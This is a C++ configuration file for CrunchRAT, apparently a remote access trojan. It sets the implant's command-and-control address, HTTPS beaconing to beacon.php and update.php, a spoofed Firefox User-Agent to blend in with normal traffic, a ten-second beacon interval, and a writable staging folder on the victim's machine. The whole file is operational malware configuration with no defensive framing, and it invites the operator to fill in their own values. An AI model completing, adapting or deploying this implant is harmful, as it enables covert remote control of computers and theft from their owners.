// CrunchRAT configuration file
// Please change these variables
#include <String>

extern wstring Ip = L"192.168.1.135";
extern wstring Protocol = L"https";
extern wstring UserAgent = L"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1";
extern wstring BeaconFile = L"beacon.php";
extern wstring UpdateFile = L"update.php";
extern int BeaconInterval = 10000;
extern wstring PostBoundary = L"TEST";
extern wstring DownloadPath = L"C:\\Users\\Public\\Videos"; // Staging directory - Must have write access to this directory